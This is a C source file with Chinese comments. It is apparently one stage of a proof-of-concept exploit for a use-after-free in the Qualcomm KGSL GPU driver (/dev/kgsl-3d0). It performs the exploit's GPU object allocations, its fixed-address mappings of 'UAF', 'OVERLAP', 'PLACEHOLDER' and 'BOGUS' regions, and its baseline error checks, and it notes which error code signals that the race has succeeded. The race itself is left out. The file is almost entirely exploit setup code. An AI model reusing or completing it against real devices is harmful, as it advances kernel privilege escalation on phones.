/*
 * k3_geom_full.c — 满尺寸四段 range 几何复核（PoC 步骤 [1]–[7]，不含竞态）
 *
 * 目的：确认 256 MB 的 UAF 对象（[0x7001ff000, 0x800203000)，跨越 SVM64 上界
 *       0x800000000）在本机仍可 alloc + mmap(FIXED) 成功。
 * 不含：MAP_USER_MEM(BOGUS)/竞速/GPU 命令提交 —— 全部为无害的分配与映射。
 *
 * 预期（与 PoC 未竞速基线一致）：
 *   - UAF / PLACEHOLDER mmap 成功
 *   - OVERLAP mmap 失败 ENOMEM(12)：UAF 的 rbtree 条目仍占位
 *   - 竞速成功后该失败码应变为 ENODEV(19)，届时才进入下一阶段
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

#define KGSL_IOC_TYPE 0x09
#define PAGE 4096

struct kgsl_gpuobj_alloc {
	uint64_t size;
	uint64_t flags;
	uint64_t va_len;
	uint64_t mmapsize;
	unsigned int id;
	unsigned int metadata_len;
	uint64_t metadata;
};

struct kgsl_gpuobj_free {
	uint64_t flags;
	uint64_t priv;
	unsigned int id;
	unsigned int type;
	unsigned int len;
};

struct kgsl_gpuobj_info {
	uint64_t gpuaddr;
	uint64_t flags;
	uint64_t size;
	uint64_t va_len;
	uint64_t va_addr;
	unsigned int id;
};

#define IOCTL_KGSL_GPUOBJ_ALLOC \
	_IOWR(KGSL_IOC_TYPE, 0x45, struct kgsl_gpuobj_alloc)
#define IOCTL_KGSL_GPUOBJ_FREE \
	_IOW(KGSL_IOC_TYPE, 0x46, struct kgsl_gpuobj_free)
#define IOCTL_KGSL_GPUOBJ_INFO \
	_IOWR(KGSL_IOC_TYPE, 0x47, struct kgsl_gpuobj_info)

#define KGSL_MEMFLAGS_USE_CPU_MAP 0x10000000ULL

#define UAF_START     0x00000007001ff000ULL
#define UAF_SIZE      0x0000000010004000ULL
#define OVERLAP_START 0x00000007001fe000ULL
#define OVERLAP_SIZE  0x0000000000007000ULL
#define PLACEH_START  0x0000000710204000ULL
#define PLACEH_SIZE   0x0000000000010000ULL
#define BOGUS_START   0x0000000700204000ULL

static int fd = -1;

static void meminfo(const char *tag)
{
	FILE *f = fopen("/proc/meminfo", "r");
	char line[128];
	int shown = 0;
	printf("  [%s] ", tag);
	if (!f) {
		printf("(meminfo 不可读)\n");
		return;
	}
	while (fgets(line, sizeof(line), f) && shown < 3) {
		if (!strncmp(line, "MemFree:", 8) ||
		    !strncmp(line, "MemAvailable:", 13) ||
		    !strncmp(line, "SwapFree:", 9)) {
			line[strcspn(line, "\n")] = 0;
			printf("%s | ", line);
			shown++;
		}
	}
	fclose(f);
	printf("\n");
	fflush(stdout);
}

static int obj_alloc(uint64_t size, unsigned int *id, uint64_t *ms)
{
	struct kgsl_gpuobj_alloc al;
	memset(&al, 0, sizeof(al));
	al.size = size;
	al.flags = KGSL_MEMFLAGS_USE_CPU_MAP;
	if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &al)) {
		printf("  ALLOC(0x%llx) FAIL errno=%d (%s)\n",
		       (unsigned long long)size, errno, strerror(errno));
		return -1;
	}
	*id = al.id;
	*ms = al.mmapsize;
	printf("  ALLOC(0x%llx) OK id=%u mmapsize=0x%llx\n",
	       (unsigned long long)size, al.id, (unsigned long long)al.mmapsize);
	fflush(stdout);
	return 0;
}

static void *obj_mmap(unsigned int id, uint64_t ms, uint64_t at, const char *tag)
{
	void *p = mmap((void *)(uintptr_t)at, (size_t)ms, PROT_READ | PROT_WRITE,
		       MAP_SHARED | MAP_FIXED, fd, (off_t)id << 12);
	int e = errno;
	if (p == MAP_FAILED || (uint64_t)(uintptr_t)p != at) {
		printf("  mmap(%s @0x%llx len=0x%llx) FAIL errno=%d (%s)\n", tag,
		       (unsigned long long)at, (unsigned long long)ms, e,
		       strerror(e));
		fflush(stdout);
		return MAP_FAILED;
	}
	printf("  mmap(%s @0x%llx len=0x%llx) OK\n", tag,
	       (unsigned long long)at, (unsigned long long)ms);
	fflush(stdout);
	return p;
}

int main(void)
{
	unsigned int uaf_id = 0, ov_id = 0, ph_id = 0;
	uint64_t uaf_ms = 0, ov_ms = 0, ph_ms = 0;
	void *p;
	size_t i;

	printf("k3_geom_full | pid=%d uid=%d\n", getpid(), getuid());
	fd = open("/dev/kgsl-3d0", O_RDWR | O_CLOEXEC);
	if (fd < 0) {
		printf("open FAIL errno=%d\n", errno);
		return 1;
	}
	meminfo("before");

	printf("\n[1] UAF alloc 0x%llx\n", (unsigned long long)UAF_SIZE);
	if (obj_alloc(UAF_SIZE, &uaf_id, &uaf_ms))
		return 1;

	printf("\n[2] OVERLAP alloc 0x%llx（先不 mmap）\n",
	       (unsigned long long)OVERLAP_SIZE);
	if (obj_alloc(OVERLAP_SIZE, &ov_id, &ov_ms))
		return 1;

	printf("\n[3] UAF mmap FIXED\n");
	p = obj_mmap(uaf_id, uaf_ms, UAF_START, "UAF");
	if (p == MAP_FAILED)
		return 1;

	/* 抽样触碰：每 1024 页一次，首末页必触 */
	((volatile char *)p)[0] = 0x5a;
	((volatile char *)p)[uaf_ms - PAGE] = 0x5a;
	for (i = 0; i + PAGE < uaf_ms; i += PAGE * 1024)
		((volatile char *)p)[i] = 0x5a;
	printf("  touch 抽样完成（含首末页）\n");
	meminfo("after UAF touch");

	printf("\n[4] UAF munmap（PTE 与 rbtree 条目预期残留）\n");
	munmap(p, (size_t)uaf_ms);

	printf("\n[5] BOGUS 匿名 VMA（3 页，不调用 MAP_USER_MEM）\n");
	p = mmap((void *)(uintptr_t)BOGUS_START, PAGE * 3, PROT_READ | PROT_WRITE,
		 MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
	if (p == MAP_FAILED)
		printf("  BOGUS VMA FAIL errno=%d (%s)\n", errno, strerror(errno));
	else {
		printf("  BOGUS VMA OK @0x%llx\n",
		       (unsigned long long)BOGUS_START);
		((volatile char *)p)[0] = 1;
		((volatile char *)p)[PAGE] = 1;
		((volatile char *)p)[PAGE * 2] = 1;
	}

	printf("\n[6] PLACEHOLDER alloc + mmap FIXED\n");
	if (obj_alloc(PLACEH_SIZE, &ph_id, &ph_ms) == 0) {
		p = obj_mmap(ph_id, ph_ms, PLACEH_START, "PLACEHOLDER");
		if (p != MAP_FAILED) {
			((volatile char *)p)[0] = 1;
			munmap(p, (size_t)ph_ms);
		}
	}

	printf("\n[7] OVERLAP mmap FIXED（未竞速基线，预期 ENOMEM=12）\n");
	p = obj_mmap(ov_id, ov_ms, OVERLAP_START, "OVERLAP");
	if (p != MAP_FAILED)
		munmap(p, (size_t)ov_ms);

	printf("\n[8] 清理\n");
	{
		struct kgsl_gpuobj_free fr;
		memset(&fr, 0, sizeof(fr));
		fr.id = ov_id;
		ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
		if (ph_id) {
			fr.id = ph_id;
			ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
		}
		fr.id = uaf_id;
		ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
	}
	munmap((void *)(uintptr_t)BOGUS_START, PAGE * 3);
	close(fd);
	meminfo("after cleanup");
	printf("\ndone\n");
	return 0;
}
